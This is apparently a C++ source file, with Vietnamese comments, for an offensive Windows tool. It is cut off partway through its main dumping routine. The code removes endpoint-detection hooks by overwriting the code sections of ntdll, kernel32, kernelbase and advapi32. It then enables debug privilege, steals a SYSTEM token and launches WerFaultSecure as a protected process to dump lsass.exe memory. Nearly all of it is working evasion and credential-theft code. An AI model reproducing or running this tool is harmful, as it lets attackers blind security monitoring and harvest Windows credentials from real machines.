#define WIN32_NO_STATUS
#include <stdio.h>
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <thread>
#include <sstream>
#include <tlhelp32.h>
#include "PPLHelp.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define SECTION_MAP_READ        0x0004
#define OBJ_CASE_INSENSITIVE    0x00000040
#define DEBUG_PROCESS           0x00000001

#ifndef SystemProcessInformation
#define SystemProcessInformation 5
#endif

// ============================================================
// NT structs
// ============================================================
typedef struct _MY_CLIENT_ID {
    HANDLE UniqueProcess; HANDLE UniqueThread;
} MY_CLIENT_ID, * PMY_CLIENT_ID;

typedef struct _MY_SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime, UserTime, CreateTime;
    ULONG WaitTime; PVOID StartAddress; MY_CLIENT_ID ClientId;
    LONG Priority, BasePriority; ULONG ContextSwitches, ThreadState, WaitReason;
} MY_SYSTEM_THREAD_INFORMATION;

typedef LONG KPRIORITY;
typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset, NumberOfThreads;
    LARGE_INTEGER Reserved[3], CreateTime, UserTime, KernelTime;
    UNICODE_STRING ImageName; KPRIORITY BasePriority;
    HANDLE UniqueProcessId, InheritedFromUniqueProcessId;
    ULONG HandleCount, SessionId; ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize, VirtualSize; ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize, WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage, QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage, QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage, PeakPagefileUsage, PrivatePageCount;
    LARGE_INTEGER ReadOperationCount, WriteOperationCount, OtherOperationCount;
    LARGE_INTEGER ReadTransferCount, WriteTransferCount, OtherTransferCount;
    MY_SYSTEM_THREAD_INFORMATION Threads[1];
} MY_SYSTEM_PROCESS_INFORMATION;

typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount; LUID Luid; DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, * PMY_LDR_DATA_TABLE_ENTRY;

// ============================================================
// Function typedefs
// ============================================================
typedef NTSTATUS(WINAPI* t_NtOpenProcessToken)        (HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* t_NtAdjustPrivilegesToken)   (HANDLE, BOOL, TOKEN_PRIVILEGES_STRUCT*, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* t_NtQueryInformationProcess) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* t_NtReadVirtualMemory)       (HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* t_NtOpenSection)             (HANDLE*, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(WINAPI* t_NtMapViewOfSection)        (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(WINAPI* t_NtUnmapViewOfSection)      (HANDLE, PVOID);
typedef NTSTATUS(WINAPI* t_NtClose)                   (HANDLE);
typedef NTSTATUS(WINAPI* t_NtResumeProcess)           (HANDLE);
typedef NTSTATUS(NTAPI* t_NtOpenProcess)             (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, MY_CLIENT_ID*);
typedef NTSTATUS(NTAPI* t_NtQuerySystemInformation)  (ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* t_NtQueryVirtualMemory)      (HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* t_NtProtectVirtualMemory)    (HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(WINAPI* t_NtWriteVirtualMemory)      (HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* t_NtGetNextProcess)          (HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);

// ============================================================
// Globals
// ============================================================
t_NtOpenProcessToken        g_NtOpenProcessToken;
t_NtAdjustPrivilegesToken   g_NtAdjustPrivilegesToken;
t_NtQueryInformationProcess g_NtQueryInformationProcess;
t_NtReadVirtualMemory       g_NtReadVirtualMemory;
t_NtOpenSection             g_NtOpenSection;
t_NtMapViewOfSection        g_NtMapViewOfSection;
t_NtUnmapViewOfSection      g_NtUnmapViewOfSection;
t_NtClose                   g_NtClose;
t_NtResumeProcess           g_NtResumeProcess;
t_NtOpenProcess             g_NtOpenProcess;
t_NtQuerySystemInformation  g_NtQuerySystemInformation;
t_NtQueryVirtualMemory      g_NtQueryVirtualMemory;
t_NtProtectVirtualMemory    g_NtProtectVirtualMemory;
t_NtWriteVirtualMemory      g_NtWriteVirtualMemory;
t_NtGetNextProcess          g_NtGetNextProcess;

// ============================================================
// Helpers
// ============================================================
static UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    us.Buffer = (PWSTR)str;
    us.Length = (USHORT)(wcslen(str) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}

PVOID ReadRemoteIntPtr(HANDLE h, PVOID addr) {
    BYTE buf[8] = { 0 }; SIZE_T rd;
    g_NtReadVirtualMemory(h, addr, buf, 8, &rd);
    return (PVOID)(*(long long*)buf);
}
char* ReadRemoteWStr(HANDLE h, PVOID addr) {
    BYTE buf[256] = { 0 }; SIZE_T rd;
    g_NtReadVirtualMemory(h, addr, buf, 256, &rd);
    static char out[128]; int i = 0;
    for (int j = 0; j < 254; j += 2) { if (!buf[j] && !buf[j + 1])break; out[i++] = (char)(*(wchar_t*)&buf[j]); }
    out[i] = '\0'; return out;
}

void* GetProcAddressFromExportTable(void* pBase, const char* fn) {
    HANDLE h = GetCurrentProcess(); SIZE_T aux;
    DWORD lfanew; g_NtReadVirtualMemory(h, (BYTE*)pBase + 0x3C, &lfanew, 4, &aux);
    DWORD expRVA; g_NtReadVirtualMemory(h, (BYTE*)pBase + lfanew + 136, &expRVA, 4, &aux);
    if (!expRVA) return NULL;
    DWORD nN, fnR, nmR, orR;
    g_NtReadVirtualMemory(h, (BYTE*)pBase + expRVA + 0x18, &nN, 4, &aux);
    g_NtReadVirtualMemory(h, (BYTE*)pBase + expRVA + 0x1C, &fnR, 4, &aux);
    g_NtReadVirtualMemory(h, (BYTE*)pBase + expRVA + 0x20, &nmR, 4, &aux);
    g_NtReadVirtualMemory(h, (BYTE*)pBase + expRVA + 0x24, &orR, 4, &aux);
    void* fnArr = (BYTE*)pBase + fnR, * nmArr = (BYTE*)pBase + nmR, * orArr = (BYTE*)pBase + orR;
    for (DWORD i = 0; i < nN; i++) {
        DWORD neR; g_NtReadVirtualMemory(h, nmArr, &neR, 4, &aux);
        char tmp[256] = { 0 };
        g_NtReadVirtualMemory(h, (BYTE*)pBase + neR, tmp, strlen(fn) + 1, &aux);
        if (!strcmp(tmp, fn)) {
            WORD ord; g_NtReadVirtualMemory(h, orArr, &ord, 2, &aux);
            DWORD fR; g_NtReadVirtualMemory(h, (BYTE*)fnArr + ord * 4, &fR, 4, &aux);
            return (BYTE*)pBase + (fR & 0xFFFFFFFF);
        }
        nmArr = (BYTE*)nmArr + 4; orArr = (BYTE*)orArr + 2;
    }
    return NULL;
}

LPVOID GetModuleBase(const char* dll_name) {
    HANDLE h = GetCurrentProcess();
    BYTE pbi[48] = { 0 }; ULONG retLen;
    g_NtQueryInformationProcess(h, ProcessBasicInformation, pbi, 48, &retLen);
    void* peb = *(void**)((uintptr_t)pbi + 0x8);
    void* ldr = ReadRemoteIntPtr(h, (void*)((uintptr_t)peb + 0x18));
    void* fl = ReadRemoteIntPtr(h, (void*)((uintptr_t)ldr + 0x30));
    void* base = (void*)1337;
    while (base) {
        fl = (void*)((uintptr_t)fl - 0x10);
        base = ReadRemoteIntPtr(h, (void*)((uintptr_t)fl + 0x20));
        void* nb = ReadRemoteIntPtr(h, (void*)((uintptr_t)fl + 0x50));
        if (!strcmp(ReadRemoteWStr(h, nb), dll_name)) return base;
        fl = ReadRemoteIntPtr(h, (void*)((uintptr_t)fl + 0x10));
    }
    return NULL;
}

// ============================================================
// UNHOOKING ENGINE
//
// EDR hooks thường đặt tại đầu hàm trong ntdll/kernel32
// (thường là 5-byte JMP hoặc INT3).
// Ta có 3 kỹ thuật:
//   1. Overwrite .text từ clean copy trên disk
//   2. Overwrite .text từ KnownDlls section (mapped từ kernel)
//   3. Direct syscall (bypass ntdll hoàn toàn)
// ============================================================

// Lấy thông tin .text section của một module
struct SectionInfo { DWORD rva; DWORD size; };

SectionInfo GetTextSection(LPVOID base) {
    SectionInfo si = { 0,0 };
    BYTE* b = (BYTE*)base;
    DWORD lfanew = *(DWORD*)(b + 0x3C);
    WORD numSections = *(WORD*)(b + lfanew + 0x6);
    WORD optHdrSize = *(WORD*)(b + lfanew + 0x14);
    BYTE* sectionHdr = b + lfanew + 0x18 + optHdrSize;
    for (int i = 0; i < numSections; i++) {
        char name[9] = { 0 };
        memcpy(name, sectionHdr + i * 0x28, 8);
        if (!strcmp(name, ".text")) {
            si.rva = *(DWORD*)(sectionHdr + i * 0x28 + 0x0C); // VirtualAddress
            si.size = *(DWORD*)(sectionHdr + i * 0x28 + 0x10); // SizeOfRawData
            break;
        }
    }
    return si;
}

// Patch .text section của dst với bytes từ src
// Dùng NtProtectVirtualMemory để bypass write protection
BOOL PatchTextSection(LPVOID dstBase, LPVOID srcBase) {
    SectionInfo si = GetTextSection(dstBase);
    if (!si.size) { printf("[-] .text section not found\n"); return FALSE; }

    LPVOID dstText = (BYTE*)dstBase + si.rva;
    LPVOID srcText = (BYTE*)srcBase + si.rva;

    PVOID addr = dstText;
    SIZE_T sz = si.size;
    ULONG oldProt = 0;

    // Remove write protection
    NTSTATUS ns = g_NtProtectVirtualMemory(
        GetCurrentProcess(), &addr, &sz,
        PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(ns)) {
        printf("[-] NtProtectVirtualMemory: 0x%08X\n", ns); return FALSE;
    }

    memcpy(dstText, srcText, si.size);

    // Restore original protection
    g_NtProtectVirtualMemory(
        GetCurrentProcess(), &addr, &sz,
        oldProt, &oldProt);

    printf("[+] Patched .text: %u bytes @ 0x%p\n", si.size, dstText);
    return TRUE;
}

// -----------------------------------------------------------------------
// UnhookFromDisk: Load clean copy từ disk, patch .text của loaded module
// -----------------------------------------------------------------------
BOOL UnhookFromDisk(const char* dllName, const wchar_t* dllPath) {
    printf("[*] Unhook %s from disk...\n", dllName);

    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %ws: %lu\n", dllPath, GetLastError()); return FALSE;
    }

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); printf("[-] CreateFileMapping: %lu\n", GetLastError()); return FALSE; }

    LPVOID cleanBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap); CloseHandle(hFile);
    if (!cleanBase) { printf("[-] MapViewOfFile: %lu\n", GetLastError()); return FALSE; }

    LPVOID loadedBase = GetModuleBase(dllName);
    if (!loadedBase) { UnmapViewOfFile(cleanBase); printf("[-] Module %s not found\n", dllName); return FALSE; }

    BOOL ok = PatchTextSection(loadedBase, cleanBase);
    UnmapViewOfFile(cleanBase);
    return ok;
}

// -----------------------------------------------------------------------
// UnhookFromKnownDlls: Map section từ \KnownDlls, patch .text
// KnownDlls được kernel load và verify trước — clean guaranteed
// -----------------------------------------------------------------------
BOOL UnhookFromKnownDlls(const char* dllName, const wchar_t* sectionName) {
    printf("[*] Unhook %s from KnownDlls...\n", dllName);

    UNICODE_STRING us = InitUnicodeString(sectionName);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    NTSTATUS ns = g_NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (!NT_SUCCESS(ns)) { printf("[-] NtOpenSection(%ws): 0x%08X\n", sectionName, ns); return FALSE; }

    PVOID cleanBase = NULL;
    SIZE_T viewSize = 0;
    ns = g_NtMapViewOfSection(hSection, GetCurrentProcess(),
        &cleanBase, 0, 0, NULL, &viewSize,
        1,  // ViewShare
        0, PAGE_READONLY);
    g_NtClose(hSection);
    if (!NT_SUCCESS(ns)) { printf("[-] NtMapViewOfSection: 0x%08X\n", ns); return FALSE; }

    LPVOID loadedBase = GetModuleBase(dllName);
    if (!loadedBase) { g_NtUnmapViewOfSection(GetCurrentProcess(), cleanBase); return FALSE; }

    BOOL ok = PatchTextSection(loadedBase, cleanBase);
    g_NtUnmapViewOfSection(GetCurrentProcess(), cleanBase);
    return ok;
}

// -----------------------------------------------------------------------
// UnhookSingleFunction: Patch chỉ một hàm cụ thể từ clean source
// Dùng khi chỉ muốn fix một hook cụ thể mà không overwrite toàn bộ .text
// -----------------------------------------------------------------------
BOOL UnhookSingleFunction(LPVOID loadedBase, LPVOID cleanBase, const char* funcName) {
    BYTE* cleanFn = (BYTE*)GetProcAddressFromExportTable(cleanBase, funcName);
    BYTE* hookedFn = (BYTE*)GetProcAddress((HMODULE)loadedBase, funcName);
    if (!cleanFn || !hookedFn) return FALSE;

    // Kiểm tra xem có bị hook không (JMP = E9 hoặc FF25)
    if (cleanFn[0] == hookedFn[0] && cleanFn[1] == hookedFn[1] &&
        cleanFn[2] == hookedFn[2] && cleanFn[3] == hookedFn[3] &&
        cleanFn[4] == hookedFn[4]) {
        return TRUE; // Không bị hook
    }

    printf("[*] Hook detected on %s: %02X %02X %02X %02X %02X -> patching\n",
        funcName, hookedFn[0], hookedFn[1], hookedFn[2], hookedFn[3], hookedFn[4]);

    PVOID addr = hookedFn;
    SIZE_T sz = 32; // Patch 32 bytes (đủ cho prologue)
    ULONG old = 0;
    g_NtProtectVirtualMemory(GetCurrentProcess(), &addr, &sz, PAGE_EXECUTE_READWRITE, &old);
    memcpy(hookedFn, cleanFn, 32);
    g_NtProtectVirtualMemory(GetCurrentProcess(), &addr, &sz, old, &old);
    return TRUE;
}

// -----------------------------------------------------------------------
// PerformFullUnhook
//
// Chiến lược unhook:
//   1. ntdll.dll  — KnownDlls (kernel-verified, không qua disk)
//   2. kernel32.dll — disk (KnownDlls không có kernel32 mapped riêng)
//   3. kernelbase.dll — disk
//
// Sau unhook, tất cả Win32 và NT API calls sẽ dùng clean stubs
// không bị EDR intercept.
// -----------------------------------------------------------------------
void PerformFullUnhook() {
    printf("[*] Starting full unhook...\n");

    // ntdll — ưu tiên KnownDlls vì kernel verify signature
    BOOL ok = UnhookFromKnownDlls("ntdll.dll", L"\\KnownDlls\\ntdll.dll");
    if (!ok) {
        printf("[*] KnownDlls failed, trying disk...\n");
        UnhookFromDisk("ntdll.dll", L"C:\\Windows\\System32\\ntdll.dll");
    }

    // kernel32 + kernelbase — từ disk
    UnhookFromDisk("kernel32.dll", L"C:\\Windows\\System32\\kernel32.dll");
    UnhookFromDisk("kernelbase.dll", L"C:\\Windows\\System32\\kernelbase.dll");

    // advapi32 — cần cho CreateProcessAsUserW
    UnhookFromDisk("advapi32.dll", L"C:\\Windows\\System32\\advapi32.dll");

    printf("[+] Unhook complete.\n");
}

// ============================================================
// Process/Thread info
// ============================================================
DWORD GetPidByName(const wchar_t* name) {
    ULONG sz = 0x50000; PVOID buf = NULL; NTSTATUS st;
    do {
        if (buf)VirtualFree(buf, 0, MEM_RELEASE);
        buf = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf)return 0;
        st = g_NtQuerySystemInformation(SystemProcessInformation, buf, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH)sz *= 2;
    } while (st == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(st)) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }
    DWORD pid = 0; auto spi = (MY_SYSTEM_PROCESS_INFORMATION*)buf;
    while (true) {
        if (spi->ImageName.Buffer && spi->ImageName.Length > 0) {
            WCHAR n[64] = { 0 }; int len = min((int)(spi->ImageName.Length / sizeof(WCHAR)), 63);
            for (int i = 0; i < len; i++)n[i] = towlower(spi->ImageName.Buffer[i]);
            if (!wcscmp(n, name)) { pid = (DWORD)(ULONG_PTR)spi->UniqueProcessId; break; }
        }
        if (!spi->NextEntryOffset)break;
        spi = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }
    VirtualFree(buf, 0, MEM_RELEASE); return pid;
}
DWORD GetLsassPid() { return GetPidByName(L"lsass.exe"); }

DWORD GetMainThreadId(DWORD pid) {
    ULONG sz = 0x50000; PVOID buf = NULL; NTSTATUS st;
    do {
        if (buf)VirtualFree(buf, 0, MEM_RELEASE);
        buf = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf)return 0;
        st = g_NtQuerySystemInformation(SystemProcessInformation, buf, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH)sz *= 2;
    } while (st == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(st)) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }
    DWORD tid = 0; auto spi = (MY_SYSTEM_PROCESS_INFORMATION*)buf;
    while (true) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
            if (spi->NumberOfThreads > 0)tid = (DWORD)(ULONG_PTR)spi->Threads[0].ClientId.UniqueThread; break;
        }
        if (!spi->NextEntryOffset)break;
        spi = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }
    VirtualFree(buf, 0, MEM_RELEASE); return tid;
}

void EnableDebugPrivileges() {
    HANDLE tok = NULL;
    g_NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tok);
    TOKEN_PRIVILEGES_STRUCT tp = { 1,{20,0},SE_PRIVILEGE_ENABLED };
    g_NtAdjustPrivilegesToken(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    g_NtClose(tok);
    printf("[+] SeDebugPrivilege enabled.\n");
}

void ResumeProcessLoop(DWORD pid) {
    MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid,NULL };
    OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    HANDLE hp = NULL;
    if (!NT_SUCCESS(g_NtOpenProcess(&hp, PROCESS_SUSPEND_RESUME, &oa, &cid)))return;
    for (int i = 0; i < 60; i++) { Sleep(500); if (NT_SUCCESS(g_NtResumeProcess(hp))) { printf("[+] LSASS resumed\n"); break; } }
    g_NtClose(hp);
}

// ============================================================
// initializeFunctions
// Phải bootstrap với GetProcAddress trước khi có thể dùng
// CustomGetProcAddress (cần g_NtReadVirtualMemory)
// ============================================================
#define LOAD(v,t,n)   v=(t)GetProcAddress(hNtdll,n)
#define LOAD_C(v,t,n) v=(t)GetProcAddressFromExportTable(pNtdll,n)

void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    // Bootstrap 2 hàm đầu bằng Win32 GetProcAddress
    LOAD(g_NtReadVirtualMemory, t_NtReadVirtualMemory, "NtReadVirtualMemory");
    LOAD(g_NtQueryInformationProcess, t_NtQueryInformationProcess, "NtQueryInformationProcess");
    // Sau đó dùng custom export table walk
    void* pNtdll = GetModuleBase("ntdll.dll");
    LOAD_C(g_NtClose, t_NtClose, "NtClose");
    LOAD_C(g_NtOpenProcessToken, t_NtOpenProcessToken, "NtOpenProcessToken");
    LOAD_C(g_NtAdjustPrivilegesToken, t_NtAdjustPrivilegesToken, "NtAdjustPrivilegesToken");
    LOAD_C(g_NtOpenSection, t_NtOpenSection, "NtOpenSection");
    LOAD_C(g_NtMapViewOfSection, t_NtMapViewOfSection, "NtMapViewOfSection");
    LOAD_C(g_NtUnmapViewOfSection, t_NtUnmapViewOfSection, "NtUnmapViewOfSection");
    LOAD_C(g_NtResumeProcess, t_NtResumeProcess, "NtResumeProcess");
    LOAD_C(g_NtOpenProcess, t_NtOpenProcess, "NtOpenProcess");
    LOAD_C(g_NtQuerySystemInformation, t_NtQuerySystemInformation, "NtQuerySystemInformation");
    LOAD_C(g_NtQueryVirtualMemory, t_NtQueryVirtualMemory, "NtQueryVirtualMemory");
    LOAD_C(g_NtProtectVirtualMemory, t_NtProtectVirtualMemory, "NtProtectVirtualMemory");
    LOAD_C(g_NtWriteVirtualMemory, t_NtWriteVirtualMemory, "NtWriteVirtualMemory");
    LOAD_C(g_NtGetNextProcess, t_NtGetNextProcess, "NtGetNextProcess");
    printf("[+] NT APIs loaded.\n");
}

// ============================================================
// GetPrimarySystemToken
// ============================================================
HANDLE GetPrimarySystemToken() {
    const wchar_t* candidates[] = { L"winlogon.exe",L"lsass.exe",L"services.exe",NULL };
    for (int i = 0; candidates[i]; i++) {
        DWORD pid = GetPidByName(candidates[i]);
        if (!pid)continue;
        MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid,NULL };
        OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        HANDLE hProc = NULL;
        if (!NT_SUCCESS(g_NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION, &oa, &cid)))continue;
        HANDLE hToken = NULL;
        NTSTATUS ns = g_NtOpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken);
        g_NtClose(hProc);
        if (!NT_SUCCESS(ns))continue;
        HANDLE hPrimary = NULL;
        BOOL ok = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary);
        g_NtClose(hToken);
        if (!ok || !hPrimary)continue;
        printf("[+] SYSTEM token from %ws (PID=%lu)\n", candidates[i], pid);
        return hPrimary;
    }
    return NULL;
}

// ============================================================
// SpawnWerFaultSecurePPL
// ============================================================
BOOL SpawnWerFaultSecurePPL(
    const std::wstring& werPath,
    DWORD targetPID, DWORD targetTID,
    const wchar_t* outDumpPath,
    DWORD dumpType = DUMP_TYPE_DEFAULT)
{
    // Resolve sau khi unhook — dùng GetProcAddress (stubs đã clean)
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    HMODULE hAdv = GetModuleHandleA("advapi32.dll");
    if (!hAdv)hAdv = LoadLibraryA("advapi32.dll");

    typedef BOOL(WINAPI* t_CpW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef BOOL(WINAPI* t_CpAU)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef BOOL(WINAPI* t_InitAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL(WINAPI* t_UpdAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    typedef VOID(WINAPI* t_DelAL)(LPPROC_THREAD_ATTRIBUTE_LIST);

    auto _CpW = (t_CpW)GetProcAddress(hK32, "CreateProcessW");
    auto _CpAU = (t_CpAU)GetProcAddress(hAdv, "CreateProcessAsUserW");
    auto _IAL = (t_InitAL)GetProcAddress(hK32, "InitializeProcThreadAttributeList");
    auto _UAL = (t_UpdAL)GetProcAddress(hK32, "UpdateProcThreadAttribute");
    auto _DAL = (t_DelAL)GetProcAddress(hK32, "DeleteProcThreadAttributeList");

    // ----------------------------------------------------------
    // Tạo handles
    // ----------------------------------------------------------
    HANDLE hDump = CreateFileW(outDumpPath,
        GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDump == INVALID_HANDLE_VALUE) { printf("[-] CreateFileW(dump): %lu\n", GetLastError()); return FALSE; }

    std::wstring encPath = std::wstring(outDumpPath) + L"_enc";
    HANDLE hEnc = CreateFileW(encPath.c_str(),
        GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hEnc == INVALID_HANDLE_VALUE) { CloseHandle(hDump); return FALSE; }

    HANDLE hCancel = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!hCancel) { CloseHandle(hDump); CloseHandle(hEnc); return FALSE; }

    SetHandleInformation(hDump, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    SetHandleInformation(hEnc, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    SetHandleInformation(hCancel, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    printf("[+] hDump=%p(%llu)  hEnc=%p(%llu)  hCancel=%p(%llu)\n",
        hDump, (UINT_PTR)hDump, hEnc, (UINT_PTR)hEnc, hCancel, (UINT_PTR)hCancel);

    // ----------------------------------------------------------
    // Command line
    // ----------------------------------------------------------
    std::wstringstream ss;
    ss << L"\"" << werPath << L"\""
        << L" /h /pid " << targetPID << L" /tid " << targetTID
        << L" /file " << (UINT_PTR)hDump
        << L" /encfile " << (UINT_PTR)hEnc
        << L" /cancel " << (UINT_PTR)hCancel
        << L" /type " << dumpType;
    std::wstring cmd = ss.str();
    printf("[+] Cmdline: %ws\n", cmd.c_str());

    // ----------------------------------------------------------
    // PROC_THREAD_ATTRIBUTE_LIST
    // ----------------------------------------------------------
    SIZE_T attrSz = 0; _IAL(NULL, 1, 0, &attrSz);
    LPPROC_THREAD_ATTRIBUTE_LIST ptal =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSz);
    _IAL(ptal, 1, 0, &attrSz);
    DWORD protLevel = PROTECTION_LEVEL_WINTCB_LIGHT;
    if (!_UAL(ptal, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &protLevel, sizeof(protLevel), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute: %lu\n", GetLastError());
        _DAL(ptal); HeapFree(GetProcessHeap(), 0, ptal);
        CloseHandle(hDump); CloseHandle(hEnc); CloseHandle(hCancel); return FALSE;
    }

    STARTUPINFOEXW siex = { 0 };
    siex.StartupInfo.cb = sizeof(siex);
    siex.lpAttributeList = ptal;
    PROCESS_INFORMATION pi = { 0 };

    std::thread rt(ResumeProcessLoop, targetPID); rt.detach();

    // ----------------------------------------------------------
    // Tầng 1: CreateProcessW direct (nếu token là SYSTEM)
    // ----------------------------------------------------------
    printf("[+] Trying CreateProcessW (post-unhook)...\n");
    BOOL ok = _CpW(werPath.c_str(), (LPWSTR)cmd.c_str(),
        NULL, NULL, TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS,
        NULL, NULL, &siex.StartupInfo, &pi);

    if (!ok) {
        DWORD err = GetLastError();
        printf("[-] CreateProcessW failed: %lu — trying CreateProcessAsUserW\n", err);

        // Tầng 2: CreateProcessAsUserW với explicit SYSTEM token
        HANDLE hSys = GetPrimarySystemToken();
        if (hSys) {
            // Enable privileges cần thiết
            DWORD privIds[] = { 3,5,7 }; // AssignPrimaryToken, IncreaseQuota, Tcb
            for (int i = 0; i < 3; i++) {
                TOKEN_PRIVILEGES_STRUCT tp = { 1,{privIds[i],0},SE_PRIVILEGE_ENABLED };
                g_NtAdjustPrivilegesToken(hSys, FALSE, &tp, sizeof(tp), NULL, NULL);
            }
            ok = _CpAU(hSys, werPath.c_str(), (LPWSTR)cmd.c_str(),
                NULL, NULL, TRUE,
                EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS,
                NULL, NULL, &siex.StartupInfo, &pi);
            err = GetLastError();
            CloseHandle(hSys);
            if (!ok) printf("[-] CreateProcessAsUserW failed: %lu\n", err);
        }
    }

    _DAL(ptal); HeapFree(GetProcessHeap(), 0, ptal);

    if (!ok) { CloseHandle(hDump); CloseHandle(hEnc); CloseHandle(hCancel); return FALSE; }

    printf("[+] WerFaultSecure spawned — PID:%lu\n", pi.dwProcessId);

    DWORD waitRes = WaitForSingleObject(pi.hProcess, 30000);
    DWORD exitCode = 0; GetExitCodeProcess(pi.hProcess, &exitCode);
    if (waitRes == WAIT_TIMEOUT) printf("[-] Timeout — exit:0x%08X\n", exitCode);
    else printf("[+] WerFaultSecure exited: 0x%08X\n", exitCode);

    SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
